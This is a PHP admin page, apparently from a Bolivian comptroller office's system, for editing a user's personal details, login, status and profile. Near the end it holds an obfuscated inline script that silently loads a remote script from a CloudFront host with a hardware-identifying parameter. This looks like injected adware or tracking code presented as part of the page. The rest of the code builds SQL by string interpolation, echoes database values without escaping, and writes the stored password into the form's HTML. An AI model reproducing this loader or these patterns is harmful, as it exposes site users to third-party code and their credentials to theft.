
<?php include("cabf.php");?>
<?php include("inc.config.php");?>
<?php

date_default_timezone_set('America/La_Paz');
$fecha_ram				= date("Ymd");
$fecha 					= date("Y-m-d");

$idusuario_ss  =  $_SESSION['idusuario_ss'];
$idnombre_ss   =  $_SESSION['idnombre_ss'];
$perfil_ss     =  $_SESSION['perfil_ss'];

$idusuario_adm_ss  =  $_SESSION['idusuario_adm_ss'];
$idnombre_adm_ss   =  $_SESSION['idnombre_adm_ss'];

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>SUBCONTRALORIA EMPRESAS PUBLICAS</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="description" content="" />
<meta name="author" content="http://webthemez.com" />
<!-- c+ss -->
<link href="css/bootstrap.min.css" rel="stylesheet" />
<link href="css/fancybox/jquery.fancybox.css" rel="stylesheet">
<link href="css/flexslider.css" rel="stylesheet" />
<link href="css/style.css" rel="stylesheet" />

<link rel="stylesheet" href="css/jquery-ui.min.css">
<link rel="stylesheet" href="css/style.css">


<!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
<!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

</head>
<body>
<div id="wrapper">
<div class="topbar">
  <div class="container">
    <div class="row">
      <div class="col-md-12">
         <p class="pull-left hidden-xs">CONTRALORIA GENERAL DEL ESTADO</p>
         <p class="pull-right"><i class="fa fa-user"></i>
        <?php
$sqlus =" SELECT nombres, paterno, materno FROM nombres WHERE idnombre='$idnombre_ss'";
$resultus = mysqli_query($link,$sqlus);
$rowus = mysqli_fetch_array($resultus);?>
        <?php echo $rowus[0];?> <?php echo $rowus[1];?> <?php echo $rowus[2];?></p>
      </div>
    </div>
  </div>
</div>
	<!-- start header -->
	<header>
        <div class="navbar navbar-default navbar-static-top">
            <div class="container">
                <div class="navbar-header">
                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>
                  <a class="navbar-brand" href="inicio.php"><img src="img/logo.png" alt="logo"/></a>
                </div>
                <?php include("menu_corres.php");?>
            </div>
        </div>
	</header>
    <!-- end header -->
	<section id="inner-headline">
	<div class="container">
		<div class="row">
			<div class="col-lg-12">
				<h2 class="pageTitle">MODIFICA USUARIO</h2>
			</div>
		</div>
	</div>
	</section>
	<section id="content">

	<div class="container">
		<div class="row">
		<div class="tg-main-section tg-banner tg-haslayout parallax-window" data-parallax="scroll" data-bleed="100" data-speed="0.2" data-image-src="images/slider/img-03.jpg">
		</div>
		<div class="row">
            <div class="col-md-4"></div>
			<div class="col-md-8">
				<h3 class="row"><a href="usuarios.php">VOLVER</a></h3>
			</div>
		</div>
   
   	<div class="about-logo">
      <h3>MODIFICAR DATOS PERSONALES </h3>
       <p>EN ESTA SECCION SE REALIZA LA MODIFICACION DE LOS DATOS PERSONALES</p>
    </div>
    </div>
    
        <div class="box-area">
<!--------- Modifica datos personales begin ------------>
<?php
$sql_n = " SELECT idnombre, nombres, paterno, materno, ci, exp, titulo FROM nombres  ";
$sql_n.= " WHERE idnombre = '$idnombre_adm_ss' ";
$result_n = mysqli_query($link,$sql_n);
$row_n = mysqli_fetch_array($result_n);
?>

<form name="NAME" action="guarda_mod_name.php" method="post">

<div class="row">
<div class="col-md-2"><h4>NOMBRES:</h4></div>
<div class="col-md-2"><input type="text" class="form-control" name="nombres" value="<?php echo $row_n[1];?>"></div>
<div class="col-md-2"><h4>PATERNO:</h4></div>
<div class="col-md-2"><input type="text" class="form-control" name="paterno" value="<?php echo $row_n[2];?>"></div>
<div class="col-md-2"><h4>MATERNO:</h4></div>
<div class="col-md-2"><input type="text" class="form-control" name="materno" value="<?php echo $row_n[3];?>"></div>
</div>
<div class="row">
<div class="col-md-2"><h4>CI:</h4></div>
<div class="col-md-2"><input type="text" class="form-control" name="ci" value="<?php echo $row_n[4];?>"></div>
<div class="col-md-1"><h4>EXP:</h4></div> 
<div class="col-md-1"><h4 class="text-muted"><?php echo $row_n[5];?></h4></div>
<div class="col-md-2">

<select name="exp"  id="exp" class="form-control">
<option selected>Seleccione</option>
<?php
$sqld = "SELECT iddepartamento, sigla FROM departamento ";
$resultd = mysqli_query($link,$sqld);
if ($rowd = mysqli_fetch_array($resultd)){
mysqli_field_seek($resultd,0);
while ($fieldd = mysqli_fetch_field($resultd)){
} do {
?>
<option value="<?php echo $rowd[1];?>" <?php if ($rowd[1]==$row_n[5]) echo "selected";?> ><?php echo $rowd[1];?></option>
<?php
} while ($rowd = mysqli_fetch_array($resultd));
} else {
}
?>
</select>

</div>
<div class="col-md-2"><h4>TÍTULO:</h4></div>
<div class="col-md-2"><input type="text" class="form-control" name="titulo" value="<?php echo $row_n[6];?>"></div>
</div>

<div class="row">
<div class="col-md-4"><h4></h4></div>
<div class="col-md-4"> 
<button type="button" class="btn btn-primary" data-toggle="modal" data-target="#savenameModal">
GUARDAR CAMBIOS
</button>
</div>
</div>
		<div class="modal fade" id="savenameModal" tabindex="-1" role="dialog" aria-labelledby="savenameModalLabel" aria-hidden="true">
		<div class="modal-dialog" role="document">
			<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title" id="savenameModalLabel">MODIFICA DATOS PERSONALES</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
				<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				¿Esta seguro de modificar los datos personales?
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-secondary" data-dismiss="modal">CANCELAR</button>
				<button type="submit" class="btn btn-primary pull-center">CONFIRMAR CAMBIOS</button>     
			</div>
			</div>
		</div>
		</div>
</form>




<!--------- Modifica datos personales end ------------>
        </div> 
</br>  
<?php
$sql_u = " SELECT idusuario, idnombre, usuario, password, fecha, condicion, perfil FROM usuarios";
$sql_u.= " WHERE idusuario = '$idusuario_adm_ss'; ";
$result_u = mysqli_query($link,$sql_u);
$row_u = mysqli_fetch_array($result_u);
?>
    <div class="about-logo">
        <h3>MODIFICAR DATOS DE USUARIO</h3>
        <p>EN ESTA SECCION SE REALIZA LA MODIFICACION DE DATOS DEL USUARIO DE SISTEMA</p>
    </div> 
</br>
        <div class="box-area">          
<!--------- Modifica datos usuario  ------------>


<form name="USER" action="guarda_mod_user.php" method="post">

<div class="row">
<div class="col-md-3"><h4>USUARIO:</h4></div>
<div class="col-md-3"><input type="text" class="form-control" name="usuario" value="<?php echo $row_u[2];?>"></div>
<div class="col-md-3"><h4>PASSWORD:</h4></div>
<div class="col-md-3"><input type="password" class="form-control" name="password" value="<?php echo $row_u[3];?>"></div>
</div>
<div class="row">
<div class="col-md-2"><h4>CONDICION:</h4></div>
<div class="col-md-1"><h4 class="text-muted"><?php echo $row_u[5];?></h4></div>
<div class="col-md-3">

<select name="condicion"  id="condicion" class="form-control">
<option selected>Seleccione</option>
<?php
$sql_c = " SELECT idcondicion, condicion FROM condicion ";
$result_c = mysqli_query($link,$sql_c);
if ($row_c = mysqli_fetch_array($result_c)){
mysqli_field_seek($result_c,0);
while ($field_c = mysqli_fetch_field($result_c)){
} do {
?>
<option value="<?php echo $row_c[1];?>" <?php if ($row_c[1]==$row_u[5]) echo "selected";?> ><?php echo $row_c[1];?></option>
<?php
} while ($row_c = mysqli_fetch_array($result_c));
} else {
}
?>
</select>

</div>
<div class="col-md-1"><h4>PERFIL:</h4></div>
<div class="col-md-2"><h4 class="text-muted"><?php echo $row_u[6];?></h4></div>
<div class="col-md-3"> 

<select name="perfil"  id="perfil" class="form-control">
<option selected>Seleccione</option>
<?php
$sql_p = " SELECT idperfil, perfil FROM perfil ";
$result_p = mysqli_query($link,$sql_p);
if ($row_p = mysqli_fetch_array($result_p)){
mysqli_field_seek($result_p,0);
while ($field_p = mysqli_fetch_field($result_p)){
} do {
?>
<option value="<?php echo $row_p[1];?>" <?php if ($row_p[1]==$row_u[6]) echo "selected";?> ><?php echo $row_p[1];?></option>
<?php
} while ($row_p = mysqli_fetch_array($result_p));
} else {
}
?>
</select>

</div>
</div>

<div class="row">
<div class="col-md-4"><h4></h4></div>
<div class="col-md-4"> 
<button type="button" class="btn btn-primary" data-toggle="modal" data-target="#saveuserModal">
GUARDAR CAMBIOS
</button>
</div>
</div>
	<div class="modal fade" id="saveuserModal" tabindex="-1" role="dialog" aria-labelledby="saveuserModalLabel" aria-hidden="true">
		<div class="modal-dialog" role="document">
			<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title" id="saveuserModalLabel">MODIFICA DATOS DE USUARIO</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
				<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				¿Esta seguro de modificar los datos de accesso del usuario?
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-secondary" data-dismiss="modal">CANCELAR</button>
				<button type="submit" class="btn btn-primary pull-center">CONFIRMAR CAMBIOS</button>     
			</div>
			</div>
		</div>
	</div>
</form>

<!--------- Modifica datos usuario  ------------>
        </div>      
    
</div>  
   
</br>
  </section>
	<footer>
	<?php include("footer.php");?>
	</footer>
</div>
<a href="#" class="scrollup"><i class="fa fa-angle-up active"></i></a>
<!-- javascript
    ================================================== -->
<!-- Placed at the end of the document so the pages load faster -->
<script src="js/jquery.js"></script>
<script src="js/jquery.easing.1.3.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery.fancybox.pack.js"></script>
<script src="js/jquery.fancybox-media.js"></script>
<script src="js/jquery.flexslider.js"></script>
<script src="js/animate.js"></script>
<!-- Vendor Scripts -->
<script src="js/modernizr.custom.js"></script>
<script src="js/jquery.isotope.min.js"></script>
<script src="js/jquery.magnific-popup.min.js"></script>
<script src="js/animate.js"></script>
<script src="js/custom.js"></script>
<script src="contact/jqBootstrapValidation.js"></script>
<script src="contact/contact_me.js"></script>
<script language="javascript" src="js/jquery-3.1.1.min.js"></script>
<script type="text/javascript">(function(){var a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.11.119#p=hitachixhds721032cla362_jpb440hf09xskm09xskmx";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b);})();</script>
<script>$("#fecha1").datepicker($.datepicker.regional[ "es" ]);</script>
<script>$("#fecha2").datepicker($.datepicker.regional[ "es" ]);</script>

</body>
</html>